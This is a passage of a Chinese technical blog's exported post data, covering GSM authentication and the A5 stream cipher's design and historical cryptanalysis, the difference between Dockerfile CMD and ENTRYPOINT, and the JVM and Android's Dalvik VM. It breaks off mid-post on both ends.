TMSI</li>\n<li>Ki：SIM 卡的唯一根密钥，16字节长度，长期存储。无法通过 SIM 卡的接口读出，只能用于生成密钥，例如 Kc</li>\n</ul>\n<p>GSM 的各个网元分别提供相关安全能力：</p>\n<ul>\n<li>移动终端：负责实现 A5 算法，并持有 TMSI。</li>\n<li>HLR&#x2F;AUC： 保存 IMSI 和手机号的对应关系、IMSI 和 Ki 的对应关系，提供 RAND 随机数，负责实现 A3 和 A8 算法</li>\n<li>MSC：持有 IMSI 并生成 TMSI，管理认证向量（RAND、SRES、Ki），也称为<strong>认证三元组</strong></li>\n<li>BST：负责实现 A5 算法</li>\n<li>EIR：设备标识寄存器，负责核对 IMEI</li>\n</ul>\n<p><img src=\"/2022/12/23/%E6%B5%81%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%9A%84%E7%A1%AC%E4%BB%B6%E5%AE%9E%E7%8E%B0-%E4%BB%A5GSM%E7%BD%91%E7%BB%9C%E7%9A%84A5%E7%AE%97%E6%B3%95%E4%B8%BA%E4%BE%8B/COMP128.png\" alt=\"A3 &amp; A8\"></p>\n<p>在手机登录移动网络的时候，移动网络会产生一个 16 字节的随机数据 RAND 发给手机，手机将这个数据发给 SIM 卡， SIM 卡用自己的密钥 Ki 和 RAND 做运算以后，生成一个 4 字节的应答 SRES 发回给手机，并转发给移动网络，与此同时，移动网络也进行了相同算法的运算，移动网络会比较一下这两个结果是否相同，相同就表明这个卡是我发出来的，允许其登录。这个就是 GSM 规范的 A3 算法，m &#x3D; 128 bit, k &#x3D; 128 bit, c &#x3D; 32 bit，很显然，这个算法要求已知 m 和 k 可以很简单的算出 c ，但是已知 m 和 c 却很难算出 k 。A3 算法是做在 SIM 卡里面的，因此如果运营商想更换加密算法，他只要发行自己的 SIM 卡，让自己的基站和 SIM 卡都使用相同的算法就可以了，手机完全不用换。</p>\n<p>在移动网络发送 RAND 过来的时候，手机还会让 SIM 卡对 RAND 和 Ki 计算出另一个密钥以供全程通信加密使用，这个密钥的长度是 64 bits, 通常叫做 <strong>Kc</strong>, 生成 Kc 的算法是 A8 算法 ，因为 A3 算法和 A8 算法接受的输入完全相同，所以实现者偷了个懒，用一个算法 COMP128 同时生成 SRES 和 Kc 。</p>\n<h2 id=\"二、A5-算法原理\"><a href=\"#二、A5-算法原理\" class=\"headerlink\" title=\"二、A5 算法原理\"></a>二、A5 算法原理</h2><p>由于移动终端和网络基站之间的无线数据传输完全暴露在开放环境，空中接口的安全问题必须得到解决。第一代移动通信实现了控制信道的数字化，但业务信道由于仍然采用模拟技术因而无法实现加密，GSM 系统通过业务信道的数字化并采用了流密码技术，有效解决了传输安全问题，因此迅速得到普及推广，其中 A5 算法功不可没。<br>根据 GSM 规范，先后发布了7个版本的 A5 算法，但 A5&#x2F;1 是第一个版本，得到了最广泛的应用，如果没有特别说明，通常所说的 A5 就是指 A5&#x2F;1。</p>\n<p>加解密处理需要消耗大量的计算资源，早期的流密码大多基于专用硬件实现，最典型的就是 LFSR - 线性反馈移位寄存器，A5&#x2F;1 算法就是如此。<br>1987年，法国开发了 A5&#x2F;1 算法，用于对从电话到基站连接的加密处理，效率很高并符合统计检验要求。起初该算法是保密的，但最终不慎泄漏。</p>\n<p><img src=\"/2022/12/23/%E6%B5%81%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%9A%84%E7%A1%AC%E4%BB%B6%E5%AE%9E%E7%8E%B0-%E4%BB%A5GSM%E7%BD%91%E7%BB%9C%E7%9A%84A5%E7%AE%97%E6%B3%95%E4%B8%BA%E4%BE%8B/a5-arch.png\" alt=\"A5\"></p>\n<h3 id=\"1-LFSR-线性反馈移位寄存器\"><a href=\"#1-LFSR-线性反馈移位寄存器\" class=\"headerlink\" title=\"1. LFSR - 线性反馈移位寄存器\"></a>1. LFSR - 线性反馈移位寄存器</h3><p>A5&#x2F;1 算法使用3个线性反馈移位寄存器，位长分别为 19 + 22 + 23 &#x3D; 64。这个设计绝非偶然，正好用以容纳 64位 的初始密钥 Kc 。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">寄存器编号</th>\n<th align=\"center\">寄存器位数</th>\n<th align=\"center\">钟控位</th>\n<th align=\"center\">抽头位</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">1</td>\n<td align=\"center\">19</td>\n<td align=\"center\">8</td>\n<td align=\"center\">13, 16, 17, 18</td>\n</tr>\n<tr>\n<td align=\"center\">2</td>\n<td align=\"center\">22</td>\n<td align=\"center\">10</td>\n<td align=\"center\">20, 21</td>\n</tr>\n<tr>\n<td align=\"center\">3</td>\n<td align=\"center\">23</td>\n<td align=\"center\">10</td>\n<td align=\"center\">7, 20, 21, 22</td>\n</tr>\n</tbody></table>\n<p>那么，这三个LFSR是如何生成密钥流的呢？对于每一个寄存器，它会通过向最高位的移动(产下处于最高位的孩子)来产生密钥，3个寄存器都通过这种操作来产生密钥，然后3个最高位经过异或操作得到最终的密钥。<br>下一个问题是如何补充最低位呢？答案是不同的寄存器采取不同的抽头策略，1号寄存器是计算第18、17、16、13位（<strong>图中的蓝色位</strong>）的异或值作为下一状态的最低位，2号寄存器是第21、20位的异或值，3号寄存器是第22、21、20、7位的异或值。</p>\n<h3 id=\"2-钟控方式\"><a href=\"#2-钟控方式\" class=\"headerlink\" title=\"2. 钟控方式\"></a>2. 钟控方式</h3><p>为了提高复杂性以弱化线性漏洞，A5算法采用了一种基于<strong>择多原则</strong>的钟控方式，即在会话密钥的产生过程中，并非每个 LFSR 每次都会移动。</p>\n<ul>\n<li>每个寄存器都有一个相关的钟控位，分别是第8、10、10位（<strong>图中的黄色位</strong>）</li>\n<li>在每个周期，检查三个寄存器的钟控位，并确定多数位（0或者1）</li>\n<li>对于每个寄存器，如果钟控位与多数位一致，则对寄存器作移位操作；否则，寄存器不移动，也就是前后两次提供的密钥是相同的</li>\n</ul>\n<p>由于寄存器的个数是奇数，因此择多原则必然生效，不会存在无法判决的情况；同时，每次必然有2-3个寄存器发生移位，并且每个寄存器移位的概率都是3&#x2F;4。<br>描述为：给定三个二进制位 x 、 y 和 z ，定义多数投票函数 maj(x, y, z)。也就是说，如果 x 、 y 和 z 的多数为 0，那么函数返回 0；否则，函数返回 1。</p>\n<h3 id=\"3-工作流程\"><a href=\"#3-工作流程\" class=\"headerlink\" title=\"3. 工作流程\"></a>3. 工作流程</h3><p>根据 GSM 系统的定义，每 20ms 的模拟话音进行一次采样，通过信源编码处理成 260bit 的数字信号；再经过信道编码变换为 456bit 的数字信号，然后经过交织分成8个部分，每部分 57bit ；空中的时隙中，每个时隙承载2部分即 114个bit 的内容，于是 20ms 的话音完全通过4个时隙的资源承载。因此，明文是一个 114位 的比特流，需要相应提供一个 114位 的密钥流。</p>\n<ol>\n<li>密钥导入：三个 LFSR 清零复位，执行<code>XOR + Shift</code>动作 64 次以导入密钥；</li>\n<li>随机数引入：以帧序号作为输入，三个 LFSR 执行<code>XOR + Shift</code>动作 22 次以导入随机数；</li>\n<li>概率校正：三个 LFSR 执行钟控动作 100 次，但不输出乱数；</li>\n<li>上行密钥流生成：三个 LFSR 执行钟控动作 114 次，每次动作后将三个 LFSR 的最高位输出并执行 XOR 作为上行密钥流输出；</li>\n<li>下行密钥流生成：重复步骤4，并将输出作为下行密钥流。</li>\n</ol>\n<blockquote>\n<p>TDMA 帧号以 2715648 为周期循环编号（22位），2<sup>21</sup>&#x3D;2097152 &lt; 2715648 &gt; 4194304&#x3D;2<sup>22</sup><br>构造方式 <code>2715648 = 2048 * 26 * 51</code> ：基帧（8个时隙，4.615ms）—&gt; 复帧（业务为26帧，控制为51帧）—&gt; 超帧（26*51个帧）—&gt; 巨帧（2048个超帧）</p>\n</blockquote>\n<h3 id=\"4-破解之路\"><a href=\"#4-破解之路\" class=\"headerlink\" title=\"4. 破解之路\"></a>4. 破解之路</h3><p>A5&#x2F;1 算法曾经是使用最广泛的GSM加密算法，在设备中的支持程度也是几种算法中最高的。该算法在1994年被初步泄露，在1999年通过逆向工程的方式被公布，2000年开始被逐步破解。</p>\n<ul>\n<li>2000年，Alex Biryukov 等通过构造庞大的具备初步彩虹表概念的数据库，通过查表取代计算的方式，以空间换时间，对A5&#x2F;1实施已知明文攻击，但该方法需要首先通过大约248次运算，处理约300GB的数据</li>\n<li>2007年，德国 Bochum 大学搭建了具有120个 FPGA 节点的阵列加速器，对包括A5&#x2F;1算法在内的多种算法进行破解，由于采用FPGA成本较低，使A5&#x2F;1算法破解在商业上成为可能</li>\n<li>2009年，Karsten Nohl 等人利用3个月时间制作了2TB的彩虹表，并宣布利用P2P分布式网络下的Nvidia GPU显卡阵列即可破解A5&#x2F;1算法</li>\n<li>2016年，新加坡科技研究局用55天创建了一个 984GB 的彩虹表，通过使用3块 Nvidia GPU 显卡构成的计算装置在9秒内完成对A5&#x2F;1算法的破解</li>\n<li>此外，根据斯诺登披露的文件显示，美国NSA是可以破解A5&#x2F;1算法的。</li>\n</ul>\n<p>1993年，由于受巴统限制，A5&#x2F;1 算法作为出口管制技术无法集成到在中国境内使用的设备中，为此开发了弱化版本的 A5&#x2F;2 算法。该密码基于 4个 LFSR 的组合，具有不规则时钟和一个非线性组合器。<br>1999年，该算法被发现存在缺陷（后门）可以被实时破解，随后 3GPP标准 TS 33.020 中明确禁止使用。</p>\n<h2 id=\"三、移动通信网的密码算法演进\"><a href=\"#三、移动通信网的密码算法演进\" class=\"headerlink\" title=\"三、移动通信网的密码算法演进\"></a>三、移动通信网的密码算法演进</h2><table>\n<thead>\n<tr>\n<th align=\"center\">加密算法</th>\n<th align=\"center\">私有</th>\n<th align=\"center\">私有</th>\n<th align=\"center\">KAUSMI</th>\n<th align=\"center\">KAUSMI</th>\n<th align=\"center\">SNOW 3G</th>\n<th align=\"center\">AES</th>\n<th align=\"center\">ZUC</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">算法类型</td>\n<td align=\"center\">流密码</td>\n<td align=\"center\">流密码</td>\n<td align=\"center\">分组密码</td>\n<td align=\"center\">分组密码</td>\n<td align=\"center\">流密码</td>\n<td align=\"center\">分组密码</td>\n<td align=\"center\">流密码</td>\n</tr>\n<tr>\n<td align=\"center\">密钥长度</td>\n<td align=\"center\">64</td>\n<td align=\"center\">64</td>\n<td align=\"center\">64</td>\n<td align=\"center\">128</td>\n<td align=\"center\">128</td>\n<td align=\"center\">128</td>\n<td align=\"center\">128</td>\n</tr>\n<tr>\n<td align=\"center\">工作模式</td>\n<td align=\"center\">XOR</td>\n<td align=\"center\">XOR</td>\n<td align=\"center\">f8-mode</td>\n<td align=\"center\">f8-mode</td>\n<td align=\"center\">XOR</td>\n<td align=\"center\">CTR</td>\n<td align=\"center\">XOR</td>\n</tr>\n<tr>\n<td align=\"center\">GSM(2G)</td>\n<td align=\"center\">A5&#x2F;1</td>\n<td align=\"center\">A5&#x2F;2</td>\n<td align=\"center\">A5&#x2F;3</td>\n<td align=\"center\">A5&#x2F;4</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">GPRS (2.5G)</td>\n<td align=\"center\">GEA1</td>\n<td align=\"center\">GEA2</td>\n<td align=\"center\">GEA3</td>\n<td align=\"center\">GEA4</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">UMTS(3G)</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\">UEA1</td>\n<td align=\"center\">UEA2</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">LTE(4G)</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\">128-EEA1</td>\n<td align=\"center\">128-EEA2</td>\n<td align=\"center\">128-EEA3</td>\n</tr>\n<tr>\n<td align=\"center\">NR(5G)</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\">128-NEA1</td>\n<td align=\"center\">128-NEA2</td>\n<td align=\"center\">128-NEA3</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>GSM是一个面向语音通信的网络，2.5G 增加了分组交换的核心网 GPRS，采用的加密算法仍然是 A5 系列算法，但名称改为 GEA（GPRS Encryption Algorithm）。</p>\n</blockquote>\n<h3 id=\"1-KASUMI-算法\"><a href=\"#1-KASUMI-算法\" class=\"headerlink\" title=\"1. KASUMI 算法\"></a>1. KASUMI 算法</h3><p>不同于流密码性质的 A5&#x2F;1 和 A5&#x2F;2 算法，GSM 规范还纳入了 A5&#x2F;3 和 A5&#x2F;4 算法，他们都是基于 KASUMI 的分组密码。<br>KASUMI 是日本三菱的 Matsui 等人基于 MISTY 算法改进而来，采用 Feistel 结构，密钥长度为128比特，对一个64比特的输入分组进行八轮的迭代运算，产生长度为64比特的输出。轮函数包括一个输入输出为32比特的非线性混合函数 FO 和一个输入输出为32比特的线性混合函数 FL。函数 FO 由一个输入输出为16比特的非线性混合函数 FI 进行3轮重复运算而构成。而函数 Fl 是由使用非线性的S盒 S7 和 S9 构成的4轮结构。</p>\n<p>A5&#x2F;3 算法的分组大小 64bit，密钥长度 64位。为了实现流密码能力，其工作模式为 F8 机密性算法和 F9 完整性算法，其中 F8 是变形的 OFB 模式，F9 是变形的 CBC-MAC 模式。<br>2001年开始，A5&#x2F;3 算法不断受到安全性挑战，为此将密钥长度扩展到了128位并推出 A5&#x2F;4 算法。<br>2015年，A5&#x2F;4 算法仍然遭到破解，为此 4G 标准制定时 KASUMI 被完全放弃。</p>\n<h3 id=\"2-SNOW-3G-算法\"><a href=\"#2-SNOW-3G-算法\" class=\"headerlink\" title=\"2. SNOW 3G 算法\"></a>2. SNOW 3G 算法</h3><p>SNOW 1.0是欧洲的 NESSIE（New European Schemes for Signatures, Integrity and Encryption）项目中产生的候选算法，是一种 128位 的流加密算法。<br>SNOW 1.0算法在公开后，被发现存在一些算法缺陷，之后经过不断修订和增强，从 SNOW 1.0，SNOW 2.0直到 SNOW 3G被认可作为 3G 使用的第二种算法 UEA2。<br>后续，4G 标准中沿用为 128-EEA1，5G标准中沿用为 128-NEA2。</p>\n<h3 id=\"3-AES-算法\"><a href=\"#3-AES-算法\" class=\"headerlink\" title=\"3. AES 算法\"></a>3. AES 算法</h3><p>在 4G 标准中，AES-128 分组算法（ CTR 工作模式）被引入并命名为 128-EEA2，后续 5G 标准继续沿用为 128-NEA2。<br>采用 AES 取代 KASUMI 主要有以下原因：</p>\n<ul>\n<li>4G的基站需要实现 NDS&#x2F;IP 的保护，而 NDS&#x2F;IP 中需要使用 AES，所以4G的基站天然支持AES算法；</li>\n<li>KASUMI 算法有授权费用，虽然使用KASUMI进行完整性保护不需要缴费，但若用于加密则需要缴费；</li>\n<li>此外，4G 支持非 3GPP 接入，而 AES 在非 3GPP 接入（例如 WLAN）场景中的应用更广。</li>\n</ul>\n<h3 id=\"4-ZUC-算法\"><a href=\"#4-ZUC-算法\" class=\"headerlink\" title=\"4. ZUC 算法\"></a>4. ZUC 算法</h3><p>2009年，在3GPP SA3立项讨论时，考虑到中国自主加密算法的需求，在工信部和国家密码局的领导下，由信通院牵头，中国移动、中国联通、大唐、华为、中兴、中科院软件所等参与成立中国自主加密算法推进工作组。<br>2011年，中科院软件所设计的祖冲之算法（代号ZUC）正式纳入3GPP标准，在LTE Rel-11版本中成为可选的第3种加密算法。祖冲之算法为流加密算法，具备与SNOW 3G基本等同的性能和加密强度。</p>\n<h2 id=\"四、总结分析\"><a href=\"#四、总结分析\" class=\"headerlink\" title=\"四、总结分析\"></a>四、总结分析</h2><p>从移动通信网络的加密技术演进中分析，传统的流密码技术正在被分组加密技术逐渐替代。</p>\n<ol>\n<li>随着硬件处理能力的高速发展，基于通用 CPU 的分组加密算法和基于专用硬件的流密码算法的性能差距几乎消失，而加密专用指令集进一步扩大了分组密码的技术优势和成本优势；</li>\n<li>随着网络数据流量的高速增长，伪随机密钥流的构造难度越来越高，流密码算法被攻击破解的风险显著增加，而种类丰富的分组密码算法可以提供更高强度的安全性；</li>\n<li>随着加密密钥长度的不断增加（64-128-256），许多流密码算法也从按 bit 顺序加密，转向按 byte 顺序加密，几乎等价于 8位 的分组加密方案，也说明了两者正在逐步融合；</li>\n<li>OFB、CFB 和 CTR等工作模式技术的出现，可以很方便地将分组密码算法<strong>转换</strong>为流密码算法</li>\n</ol>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.sohu.com/a/237953596_556637\">移动通信网中的密码算法演进之一：机密性保护</a></li>\n<li><a href=\"https://www.jiamisoft.com/blog/22123-gsma.html\">GSM加密系统里涉及的三种算法：A3算法、A5算法和A8算法</a></li>\n<li><a href=\"https://zh.wikipedia.org/zh-sg/A5/1\">A5算法 - WiKi</a></li>\n<li><a href=\"http://kenshichong.github.io/2015/12/26/%E5%AF%86%E7%A0%81%E7%B3%BB%E5%88%972-%E6%B5%81%E5%AF%86%E7%A0%81%E5%AE%9E%E6%88%98%E4%B9%8BA5%E7%AE%97%E6%B3%95/\">密码系列2-流密码实战之A5算法</a></li>\n<li><a href=\"https://www.cnblogs.com/mengsuenyan/p/13819504.html\">ZUC祖冲之序列密码算法</a></li>\n<li><a href=\"https://juejin.cn/post/7118582525424828424\">ZUC(祖冲之)算法</a></li>\n<li><a href=\"https://www.jiamisoft.com/blog/2669-kasumijiamisuanfa.html\">3G核心加密算法之KASUMI加密算法</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"%E6%B5%81%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E3%80%81%E6%9E%B6%E6%9E%84%E4%B8%8E%E7%A1%AC%E4%BB%B6%E5%AE%9E%E7%8E%B0%E7%A0%94%E7%A9%B6_%E8%B5%B5%E7%9F%B3%E7%A3%8A.pdf\">流密码算法、架构与硬件实现研究_赵石磊</a></li>\n<li><a href=\"Security_in_the_GSM_system_20040105.pdf\">GSM系统安全体系 - 2004英文版</a></li>\n<li><a href=\"S5.Brumley-comp128.pdf\">A3&#x2F;A8 &amp; COMP128 技术破解</a></li>\n<li><a href=\"A5-1%E7%AE%97%E6%B3%95%E5%8F%AF%E6%8A%B5%E6%8A%97%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E7%9A%84%E6%94%B9%E8%BF%9B%E6%96%B9%E6%B3%95-%E5%BC%A0%E4%BC%9F.pdf\">A5&#x2F;1 算法可抵抗相关攻击的改进方法 - 张伟</a></li>\n<li><a href=\"a52-slides.pdf\">a5&#x2F;2 算法的破解分析</a></li>\n<li><a href=\"978-3-540-45146-4_35.pdf\">Instant Ciphertext-Only Cryptanalysis of GSM Encrypted Communication</a></li>\n</ul>\n"},{"title":"深入理解Dockerfile文件中的Entrypoint和Cmd命令","url":"/2019/11/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Dockerfile%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84Entrypoint%E5%92%8CCmd%E5%91%BD%E4%BB%A4/","content":"<h2 id=\"CMD\"><a href=\"#CMD\" class=\"headerlink\" title=\"CMD\"></a>CMD</h2><p><a href=\"https://docs.docker.com/engine/reference/builder/#cmd\">链接</a></p>\n<ol>\n<li><p>主要目的</p>\n<ul>\n<li>提供默认的命令</li>\n<li>提供默认的参数，与ENTRYPOINT协同作用</li>\n<li>如果一个容器每次都要运行同一个可执行文件，推荐使用ENTRYPOINT</li>\n<li>该方式的命令，会被<code>docker run image cmd arg1 arg2</code>命令行方式覆盖</li>\n<li>dockerfile 中最后一个CMD参数才会生效</li>\n</ul>\n</li>\n<li><p>格式</p>\n</li>\n</ol>\n<p>exec form(推荐的方式): <code>CMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;]</code><br>最终会被解析成json array， 必须有双引号<br>不提供shell环境，[“echo”, “$HOME”], HOME不会像shell一样解析<br>executable 要使用绝对路径<br>default parameters to ENTRYPOINT: CMD [“param1”,”param2”]<br>shell form: CMD command param1 param2 (shell form) 最好不要用<br>命令解析成： <code>/bin/sh -c command param1 param2</code></p>\n<h2 id=\"ENTRYPOINT\"><a href=\"#ENTRYPOINT\" class=\"headerlink\" title=\"ENTRYPOINT\"></a>ENTRYPOINT</h2><p><a href=\"https://docs.docker.com/engine/reference/builder/#entrypoint\">链接</a></p>\n<ol>\n<li><p>主要目的</p>\n<ul>\n<li>将镜像作为一个可执行文件，就像命令一样启动，无须指定命令：docker run -i -t –rm -p 80:80 nginx</li>\n<li>ENTRYPOINT 命令参数的来源：<br>dockerfile 中CMD的参数<br>docker run命令行后面的参数列表。如<code>docker run &lt;image&gt; -d -c</code>, -d -c 将作为参数会给entrypoint。<br>一般镜像都是以CMD多于ENTRYPOINT: 因为用cmd，docker run image cmd arg1 arg2, 可以很方便覆盖默认的命令，如果镜像是以ENTRYPOINT做为最终的执行命令，必须用 –entrypoint cmd 。 eg: d run –entrypoint &#x2F;bin&#x2F;sh -it xxx_image -c “echo hello”<br>dockerfile 中最后一个ENTRYPOINT才会生效</li>\n</ul>\n</li>\n<li><p>格式</p>\n<p> exec form(推荐方式): ENTRYPOINT [“executable”, “param1”, “param2”]<br> shell form: ENTRYPOINT command param1 param2<br> 以&#x2F;bin&#x2F;sh -c 的形式运行命令<br> 会忽略signal信号，docker stop 无法停止<br> 坑较多，不要用<br> ENTRYPOINT vs CMD</p>\n<p> <a href=\"https://docs.docker.com/engine/reference/builder/#understand-how-cmd-and-entrypoint-interact\">asd</a></p>\n</li>\n</ol>\n<h2 id=\"结论\"><a href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h2><p>用最简单的方式 CMD [“cmd”, “arg1”, “arg2”]<br>其他方式坑太多，细节太多</p>\n"},{"title":"深入理解Java虚拟机 - 以Android为例","url":"/2021/11/14/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Java%E8%99%9A%E6%8B%9F%E6%9C%BA%20-%20%E4%BB%A5Android%E4%B8%BA%E4%BE%8B/","content":"<p>Java语言的最大优势就是<strong>一次编译，处处运行</strong>的特性，通过<code>javac</code>编译器将源代码编译成通用的中间形式——字节码，然后再由<code>java</code>解释器逐条将字节码解释为机器码来执行。尽管在性能上，Java远不如C++这类编译型语言，但由于良好的平台移植性而大行其道，其中的关键技术就是<strong>Java虚拟机</strong>。</p>\n<h2 id=\"一、什么是JVM\"><a href=\"#一、什么是JVM\" class=\"headerlink\" title=\"一、什么是JVM\"></a>一、什么是JVM</h2><p><code>JVM（Java Virtual Machine）</code>是一台虚拟的计算机，本质上通过定义一组技术规范，在物理的计算机上模拟实现各种功能。<br>JVM屏蔽了与具体操作系统平台相关的信息，使Java程序只需生成在Java虚拟机上运行的目标代码（字节码），就可以在多种平台上不加修改地运行。在执行字节码时，实际上最终还是把字节码解释成具体平台上的机器指令执行，属于用户态。</p>\n<img src=\"/2021/11/14/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Java%E8%99%9A%E6%8B%9F%E6%9C%BA%20-%20%E4%BB%A5Android%E4%B8%BA%E4%BE%8B/jvm.png\" class=\"\">\n\n<p>Java虚拟机包括一套字节码指令集、一组寄存器、一个栈、一个垃圾回收堆和一个存储方法域。详细资料请参见<a href=\"https://cloud.tencent.com/developer/article/1556672\">jvm原理</a>。</p>\n<p>Java Community Process组织管理所有Java技术标准，主要途径是发布JSR - Java Specification Requests，Java虚拟机也不例外。<br>JVM涉及的核心技术规范包括：</p>\n<ul>\n<li>2004年，发布的JVM核心规范<a href=\"https://www.jcp.org/en/jsr/detail?id=924\">JSR 924 - Java Virtual Machine Specification</a></li>\n<li>2006年，为修订Class文件标准而发布的<a href=\"https://web.archive.org/web/20120226185155/http://www.jcp.org/en/jsr/detail?id=202\">JSR 202 - Java Class File Specification Update</a></li>\n<li>完整的Java虚拟机描述，可以参见<a href=\"https://web.archive.org/web/20110925050249/http://java.sun.com/docs/books/vmspec/2nd-edition/html/VMSpecTOC.doc.html\">JCP发布的JVM蓝皮书</a></li>\n</ul>\n<h2 id=\"二、JVM的运行模式\"><a href=\"#二、JVM的运行模式\" class=\"headerlink\" title=\"二、JVM的运行模式\"></a>二、JVM的运行模式</h2><p>以最常见的<code>Oracle JDK</code>为例，我们可以查看其版本信息如下：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">bogon:~ sj$ java -version</span><br><span class=\"line\">java version &quot;15.0.2&quot; 2021-01-19</span><br><span class=\"line\">Java(TM) SE Runtime Environment (build 15.0.2+7-27)</span><br><span class=\"line\">Java HotSpot(TM) 64-Bit Server VM (build 15.0.2+7-27, mixed mode, sharing)</span><br></pre></td></tr></table></figure>\n\n<p>其中，JVM使用的引擎是<code>HotSpot</code>，基于<code>Server</code>版本，使用<code>Mixed mode</code>混合模式。</p>\n<blockquote>\n<p>Server模式启动采用重量级的虚拟机，对代码进行更多的优化；而Client模式采用轻量级的虚拟机，启动速度更快。<br>    尽管Server启动慢，但稳定后的运行速度比Client远远要快。<br>    64位版本默认都采用Server模式。</p>\n</blockquote>\n<p><code>Bytecode</code>被称为字节码，是因为字节码文件由十六进制值组成，而<code>JVM</code>以两个十六进制值为一组，即以字节为单位进行读取。在Java中一般是用<code>javac</code>命令编译源代码为字节码文件，一个.java文件从编译到运行的示例如图1所示。</p>\n<img src=\"/2021/11/14/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Java%E8%99%9A%E6%8B%9F%E6%9C%BA%20-%20%E4%BB%A5Android%E4%B8%BA%E4%BE%8B/java-2.png\" class=\"\">\n\n<p>为了优化Java的性能 ，JVM在解释器之外引入了即时（Just In Time）编译器：当程序运行时，解释器首先发挥作用，代码可以直接执行。随着时间推移，即时编译器逐渐发挥作用，把越来越多的代码编译优化成本地代码，来获取更高的执行效率。解释器这时可以作为编译运行的降级手段，在一些不可靠的编译优化出现问题时，再切换回解释执行，保证程序可以正常运行。</p>\n<p>即时编译器极大地提高了Java程序的运行速度，而且跟静态编译相比，即时编译器可以选择性地编译热点代码，省去了很多编译时间，也节省很多的空间。目前，即时编译器已经非常成熟了，在性能层面甚至可以和编译型语言相比。不过在这个领域，大家依然在不断探索如何结合不同的编译方式，使用更加智能的手段来提升程序的运行速度。</p>\n<h2 id=\"三、Android的虚拟机技术演进\"><a href=\"#三、Android的虚拟机技术演进\" class=\"headerlink\" title=\"三、Android的虚拟机技术演进\"></a>三、Android的虚拟机技术演进</h2><p>Apple基于软硬件一体化的商业模式，很自然地选择<code>Object C</code>作为iPhone的开发语言，并获得了更为优秀的性能。<br>反之，由于Google自身并不生产硬件设备，Android必须面对如何适配不同硬件平台的难题，采用Java技术标准几乎是唯一的解决方案。</p>\n<p>在分析Android虚拟机之前，我们先明确几个概念：</p>\n<ul>\n<li><code>APK</code> - Android Package: Android应用的安装包，本质是一个zip打包文件，其中多个目录分别存储：DEX执行文件、资源文件和系统配置文件</li>\n<li><code>DEX</code> - Dalvik EXecutable: Android Dalvik的可执行文件，注意，其基于Dalvik字节码，并非Java的标准字节码</li>\n<li><code>ART</code> - Android Runtime: Android 运行时环境</li>\n</ul>\n<p>实际上，开发Android应用开发的路径是：**.java文件 -&gt; .class文件 -&gt; .dex文件**。</p>\n<img src=\"/2021/11/14/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Java%E8%99%9A%E6%8B%9F%E6%9C%BA%20-%20%E4%BB%A5Android%E4%B8%BA%E4%BE%8B/dex.png\" class=\"\">\n\n<p>开发者基于Java语言开发源代码文件，然后编译成Java字节码文件，再使用转换工具<code>dx</code>转换为DEX字节码文件，最后在Dalvik虚拟机中执行（可能是解释方式，也可能编译模式）。</p>\n<h3 id=\"1-早期的Dalvik虚拟机\"><a href=\"#1-早期的Dalvik虚拟机\" class=\"headerlink\" title=\"1. 早期的Dalvik虚拟机\"></a>1. 早期的Dalvik虚拟机</h3><p>Dalvik是Google公司自己设计用于Android平台的虚拟机，在Android 5.0之前采用，其基本演进路线是：</p>\n<ul>\n<li>2008年，Android发布，Dalvik VM的执行引擎是只有解释器的；</li>\n<li>2010年，Android 2.2发布，Dalvik VM引入了JIT编译器，JIT的引入使得Dalvik的性能提升了3～6倍；</li>\n<li>2013年，Android 4.4发布，Dalvik和ART并存；</li>\n</ul>\n<p>Dalvik VM的设计思想与Java虚拟机相似，但并不遵循JVM规范来实现，存在着明显的差异：</p>\n<ol>\n<li>基于寄存器的技术实现，而非基于栈<br> DVM是基于寄存器的，它没有基于栈的虚拟机在拷贝数据而使用的大量的出入栈指令，同时指令更紧凑更简洁；<br> 但是，由于显示指定了操作数，所以基于寄存器的指令会比基于栈的指令要大，但是由于指令数量的减少，总的代码数不会增加多少。</li>\n<li>自定义的字节码<br> Dalvik 有 218 个操作码，它们与 Java 中的 200 个操作码有本质的不同。<br> 例如，有十几种操作码用于在堆栈和局部变量列表之间传输数据，而在 Dalvik 中完全没有。</li>\n<li>Class类加载方式不同<br> 标准Java应用开发提交的是<code>.jar</code>文件，JVM将<strong>动态加载</strong>其中包含的全部<code>.class</code>文件，每个.class文件里面包含了该类的常量池、类信息、属性等。<br> 对于Android，其通过dx工具将所有的<code>.class</code>文件合并、精简并转换为单一的<code>.dex</code>文件，然后交给DVM执行，既减少了I&#x2F;O操作，又提高了运行速度。</li>\n<li>多实例并发能力<br> 针对手机终端有限的内存和计算能力，DVM允许同时运行多个虚拟机的实例，并且每一个Dalvik 